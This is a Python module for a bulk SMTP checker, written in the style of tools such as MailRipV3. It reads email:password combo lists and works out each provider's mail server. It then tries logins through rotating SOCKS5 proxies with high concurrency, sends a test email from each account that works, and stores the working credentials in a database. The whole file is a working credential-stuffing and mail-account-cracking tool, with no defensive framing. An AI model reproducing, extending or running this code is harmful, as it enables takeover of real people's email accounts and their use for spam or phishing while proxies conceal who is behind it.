"""
Enhanced Bulk SMTP Checker with SOCKS5 Proxy Support
Inspired by MailRipV3 multi-threading patterns and mailtools error classification
"""

import asyncio
import random
import smtplib
import socket
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum

from sqlalchemy.ext.asyncio import AsyncSession

from app_websockets.connection_manager import MessageType, connection_manager
from config.settings import settings
from core.logger import get_logger
from models.base import ProxyServer, SMTPAccount
from services.proxy_service import ProxyService

logger = get_logger(__name__)


class SMTPCheckStatus(str, Enum):
    """SMTP check result status"""

    VALID = "valid"
    INVALID = "invalid"
    AUTH_FAILED = "auth_failed"
    CONNECTION_FAILED = "connection_failed"
    TIMEOUT = "timeout"
    PROXY_FAILED = "proxy_failed"
    UNKNOWN_ERROR = "unknown_error"


class ProxyRotationStrategy(str, Enum):
    """Proxy rotation strategies"""

    ROUND_ROBIN = "round_robin"
    RANDOM = "random"
    STICKY = "sticky"
    FAILOVER = "failover"


@dataclass
class ComboEntry:
    """Email:password combo entry"""

    email: str
    password: str
    smtp_server: str | None = None
    smtp_port: int | None = None
    use_ssl: bool = True


@dataclass
class SMTPCheckResult:
    """Result of SMTP check"""

    combo: ComboEntry
    status: SMTPCheckStatus
    response_time: float | None = None
    error_message: str | None = None
    smtp_response: str | None = None
    proxy_used: str | None = None
    successful_send: bool = False
    inbox_test_result: str | None = None


@dataclass
class BulkCheckProgress:
    """Progress tracking for bulk checks"""

    total: int = 0
    checked: int = 0
    valid: int = 0
    invalid: int = 0
    errors: int = 0
    start_time: datetime = field(default_factory=datetime.now)
    estimated_completion: datetime | None = None
    current_speed: float = 0.0  # checks per second

    @property
    def percentage(self) -> float:
        if self.total == 0:
            return 0.0
        return (self.checked / self.total) * 100

    @property
    def elapsed_time(self) -> timedelta:
        return datetime.now() - self.start_time


class BulkSMTPChecker:
    """Enhanced bulk SMTP checker with SOCKS5 proxy support"""

    def __init__(self, db_session: AsyncSession, session_id: str):
        self.db = db_session
        self.session_id = session_id
        self.proxy_service = ProxyService(db_session)
        self.available_proxies: list[ProxyServer] = []
        self.proxy_index = 0
        self.progress = BulkCheckProgress()
        self.is_running = False
        self.should_stop = False

        # Configuration
        self.max_threads = getattr(settings, "BULK_SMTP_MAX_THREADS", 50)
        self.timeout = getattr(settings, "BULK_SMTP_TIMEOUT", 30)
        self.proxy_timeout = getattr(settings, "BULK_SMTP_PROXY_TIMEOUT", 15)
        self.retry_attempts = getattr(settings, "BULK_SMTP_RETRY_ATTEMPTS", 2)
        self.proxy_rotation_strategy = ProxyRotationStrategy.ROUND_ROBIN
        self.enable_inbox_test = getattr(
            settings, "BULK_SMTP_INBOX_TEST", True
        )

    async def load_proxies(self) -> int:
        """Load working SOCKS5 proxies from database"""
        try:
            self.available_proxies = (
                await self.proxy_service.get_working_proxies(
                    session_id=self.session_id, proxy_type="socks5"
                )
            )
            logger.info(
                f"Loaded {len(self.available_proxies)} working SOCKS5 proxies"
            )
            return len(self.available_proxies)
        except Exception as e:
            logger.error(f"Failed to load proxies: {e}")
            return 0

    def get_next_proxy(self) -> ProxyServer | None:
        """Get next proxy based on rotation strategy"""
        if not self.available_proxies:
            return None

        if self.proxy_rotation_strategy == ProxyRotationStrategy.ROUND_ROBIN:
            proxy = self.available_proxies[self.proxy_index]
            self.proxy_index = (self.proxy_index + 1) % len(
                self.available_proxies
            )
            return proxy
        elif self.proxy_rotation_strategy == ProxyRotationStrategy.RANDOM:
            return random.choice(self.available_proxies)
        else:
            return self.available_proxies[0]

    async def parse_combo_list(self, combo_data: str) -> list[ComboEntry]:
        """Parse combo list from various formats (email:password, email|password, etc.)"""
        combos = []
        lines = combo_data.strip().split("\n")

        for line_num, line in enumerate(lines, 1):
            line = line.strip()
            if not line or line.startswith("#"):
                continue

            # Try different separators
            for separator in [":", "|", ";", "\t"]:
                if separator in line:
                    parts = line.split(separator, 1)
                    if len(parts) == 2:
                        email, password = parts[0].strip(), parts[1].strip()
                        if "@" in email and email.count("@") == 1:
                            # Extract SMTP server info from email domain
                            domain = email.split("@")[1].lower()
                            smtp_server, smtp_port = (
                                self._get_smtp_server_info(domain)
                            )

                            combos.append(
                                ComboEntry(
                                    email=email,
                                    password=password,
                                    smtp_server=smtp_server,
                                    smtp_port=smtp_port,
                                )
                            )
                            break
            else:
                logger.warning(f"Could not parse line {line_num}: {line}")

        logger.info(
            f"Parsed {len(combos)} valid combos from {len(lines)} lines"
        )
        return combos

    def _get_smtp_server_info(
        self, domain: str
    ) -> tuple[str | None, int | None]:
        """Get SMTP server and port for domain"""
        # Common SMTP server mappings (inspired by MailRipV3)
        smtp_mappings = {
            "gmail.com": ("smtp.gmail.com", 587),
            "outlook.com": ("smtp-mail.outlook.com", 587),
            "hotmail.com": ("smtp-mail.outlook.com", 587),
            "yahoo.com": ("smtp.mail.yahoo.com", 587),
            "mail.ru": ("smtp.mail.ru", 587),
            "yandex.com": ("smtp.yandex.com", 587),
            "aol.com": ("smtp.aol.com", 587),
        }

        if domain in smtp_mappings:
            return smtp_mappings[domain]

        # Try common patterns
        common_patterns = [
            f"smtp.{domain}",
            f"mail.{domain}",
            f"smtp.mail.{domain}",
        ]

        for server in common_patterns:
            try:
                socket.gethostbyname(server)
                return server, 587  # Default to STARTTLS port
            except socket.gaierror:
                continue

        return None, None

    async def check_smtp_combo(
        self, combo: ComboEntry, proxy: ProxyServer | None = None
    ) -> SMTPCheckResult:
        """Check single SMTP combo with optional proxy"""
        start_time = time.time()

        try:
            # Create SOCKS connection if proxy provided
            if proxy:
                try:
                    sock = await self.proxy_service.create_socks_connection(
                        proxy,
                        combo.smtp_server,
                        combo.smtp_port,
                        self.proxy_timeout,
                    )
                    proxy_info = f"{proxy.host}:{proxy.port}"
                except Exception as e:
                    return SMTPCheckResult(
                        combo=combo,
                        status=SMTPCheckStatus.PROXY_FAILED,
                        error_message=f"Proxy connection failed: {e}",
                        proxy_used=f"{proxy.host}:{proxy.port}",
                    )
            else:
                sock = None
                proxy_info = None

            # Test SMTP connection
            result = await self._test_smtp_connection(combo, sock)
            result.proxy_used = proxy_info
            result.response_time = time.time() - start_time

            # Perform inbox test if enabled and connection is valid
            if (
                self.enable_inbox_test
                and result.status == SMTPCheckStatus.VALID
                and sock
            ):
                try:
                    inbox_result = await self._perform_inbox_test(combo, sock)
                    result.inbox_test_result = inbox_result
                    result.successful_send = "success" in inbox_result.lower()
                except Exception as e:
                    result.inbox_test_result = f"Inbox test failed: {e}"

            return result

        except Exception as e:
            return SMTPCheckResult(
                combo=combo,
                status=SMTPCheckStatus.UNKNOWN_ERROR,
                error_message=str(e),
                response_time=time.time() - start_time,
                proxy_used=proxy_info if proxy else None,
            )

    async def _test_smtp_connection(
        self, combo: ComboEntry, sock: socket.socket | None = None
    ) -> SMTPCheckResult:
        """Test SMTP connection with detailed error classification"""
        try:
            # Determine connection method
            if combo.smtp_port == 465:
                # SSL connection
                if sock:
                    server = smtplib.SMTP_SSL(sock=sock)
                else:
                    server = smtplib.SMTP_SSL(
                        combo.smtp_server,
                        combo.smtp_port,
                        timeout=self.timeout,
                    )
            else:
                # STARTTLS connection
                if sock:
                    server = smtplib.SMTP(sock=sock)
                else:
                    server = smtplib.SMTP(
                        combo.smtp_server,
                        combo.smtp_port,
                        timeout=self.timeout,
                    )

                if combo.smtp_port != 25:  # Enable STARTTLS for non-port 25
                    server.starttls()

            # Test authentication
            try:
                response = server.login(combo.email, combo.password)
                server.quit()

                return SMTPCheckResult(
                    combo=combo,
                    status=SMTPCheckStatus.VALID,
                    smtp_response=str(response),
                )

            except smtplib.SMTPAuthenticationError as e:
                server.quit()
                return SMTPCheckResult(
                    combo=combo,
                    status=SMTPCheckStatus.AUTH_FAILED,
                    error_message=str(e),
                    smtp_response=str(e),
                )

        except smtplib.SMTPConnectError as e:
            return SMTPCheckResult(
                combo=combo,
                status=SMTPCheckStatus.CONNECTION_FAILED,
                error_message=f"Connection failed: {e}",
            )
        except TimeoutError:
            return SMTPCheckResult(
                combo=combo,
                status=SMTPCheckStatus.TIMEOUT,
                error_message="Connection timeout",
            )
        except Exception as e:
            return SMTPCheckResult(
                combo=combo,
                status=SMTPCheckStatus.UNKNOWN_ERROR,
                error_message=str(e),
            )

    async def _perform_inbox_test(
        self, combo: ComboEntry, sock: socket.socket
    ) -> str:
        """Perform inbox delivery test (inspired by MailRipV3)"""
        try:
            # Create test email
            test_email = f"test-{int(time.time())}@example.com"
            subject = (
                f"SMTP Test - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            body = f"""
SMTP Test Message

Account: {combo.email}
Server: {combo.smtp_server}:{combo.smtp_port}
Timestamp: {datetime.now().isoformat()}
            """.strip()

            # Send test email
            server = smtplib.SMTP(sock=sock)
            message = f"""From: {combo.email}
To: {test_email}
Subject: {subject}

{body}
"""
            server.sendmail(combo.email, [test_email], message)
            server.quit()

            return "Inbox test successful - email sent"

        except Exception as e:
            return f"Inbox test failed: {e}"

    async def update_progress(self):
        """Update and broadcast progress via WebSocket"""
        # Calculate current speed
        elapsed = self.progress.elapsed_time.total_seconds()
        if elapsed > 0:
            self.progress.current_speed = self.progress.checked / elapsed

        # Estimate completion time
        if self.progress.current_speed > 0:
            remaining = self.progress.total - self.progress.checked
            seconds_remaining = remaining / self.progress.current_speed
            self.progress.estimated_completion = datetime.now() + timedelta(
                seconds=seconds_remaining
            )

        # Broadcast progress via WebSocket
        progress_data = {
            "type": "bulk_smtp_progress",
            "session_id": self.session_id,
            "total": self.progress.total,
            "checked": self.progress.checked,
            "valid": self.progress.valid,
            "invalid": self.progress.invalid,
            "errors": self.progress.errors,
            "percentage": self.progress.percentage,
            "speed": self.progress.current_speed,
            "estimated_completion": self.progress.estimated_completion.isoformat()
            if self.progress.estimated_completion
            else None,
            "elapsed_time": str(self.progress.elapsed_time),
        }

        await connection_manager.broadcast_to_all(
            {
                "type": MessageType.MONITORING_UPDATE.value,
                "data": progress_data,
            }
        )

    async def run_bulk_check(
        self, combos: list[ComboEntry]
    ) -> list[SMTPCheckResult]:
        """Run bulk SMTP check with pure async implementation for high concurrency"""
        self.is_running = True
        self.should_stop = False
        self.progress = BulkCheckProgress(total=len(combos))

        logger.info(
            f"Starting bulk SMTP check of {len(combos)} combos with {self.max_threads} concurrent tasks"
        )

        # Load proxies
        await self.load_proxies()

        results = []

        # Use semaphore to limit concurrent connections instead of ThreadPoolExecutor
        semaphore = asyncio.Semaphore(self.max_threads)

        async def check_with_semaphore(combo: ComboEntry):
            """Check single combo with semaphore control"""
            async with semaphore:
                if self.should_stop:
                    return None

                proxy = self.get_next_proxy()
                try:
                    result = await self.check_smtp_combo(combo, proxy)

                    # Update progress counters
                    self.progress.checked += 1
                    if result.status == SMTPCheckStatus.VALID:
                        self.progress.valid += 1
                    elif result.status in [
                        SMTPCheckStatus.AUTH_FAILED,
                        SMTPCheckStatus.INVALID,
                    ]:
                        self.progress.invalid += 1
                    else:
                        self.progress.errors += 1

                    # Update progress every 10 checks or when complete
                    if (
                        self.progress.checked % 10 == 0
                        or self.progress.checked == self.progress.total
                    ):
                        await self.update_progress()

                    return result
                except Exception as e:
                    logger.error(f"Error processing SMTP check: {e}")
                    self.progress.errors += 1
                    return None

        # Create tasks for all combos
        tasks = [check_with_semaphore(combo) for combo in combos]

        # Process tasks in batches to handle large volumes efficiently
        batch_size = min(1000, len(tasks))  # Process in batches of 1000

        try:
            for i in range(0, len(tasks), batch_size):
                if self.should_stop:
                    break

                batch = tasks[i : i + batch_size]
                batch_results = await asyncio.gather(
                    *batch, return_exceptions=True
                )

                # Filter out None results and exceptions
                valid_results = [
                    result
                    for result in batch_results
                    if result is not None and not isinstance(result, Exception)
                ]
                results.extend(valid_results)

                # Short delay between batches to prevent overwhelming the system
                if i + batch_size < len(tasks):
                    await asyncio.sleep(0.1)

        except Exception as e:
            logger.error(f"Error in bulk SMTP check: {e}")
        finally:
            self.is_running = False
            # Final progress update
            await self.update_progress()

        logger.info(
            f"Bulk SMTP check completed: {self.progress.valid} valid, {self.progress.invalid} invalid, {self.progress.errors} errors"
        )
        return results

    async def stop_check(self):
        """Stop the bulk check"""
        self.should_stop = True
        logger.info("Bulk SMTP check stop requested")

    async def save_results_to_database(self, results: list[SMTPCheckResult]):
        """Save valid results to database"""
        valid_results = [
            r for r in results if r.status == SMTPCheckStatus.VALID
        ]

        for result in valid_results:
            try:
                # Create SMTP account entry
                smtp_account = SMTPAccount(
                    session_id=self.session_id,
                    smtp_server=result.combo.smtp_server,
                    smtp_port=result.combo.smtp_port,
                    email=result.combo.email,
                    password=result.combo.password,
                    status="checked",
                    is_checked=True,
                    last_checked=datetime.now(),
                    response_time=result.response_time,
                    use_ssl=result.combo.use_ssl,
                )

                self.db.add(smtp_account)

            except Exception as e:
                logger.error(f"Error saving SMTP result to database: {e}")

        await self.db.commit()
        logger.info(
            f"Saved {len(valid_results)} valid SMTP accounts to database"
        )
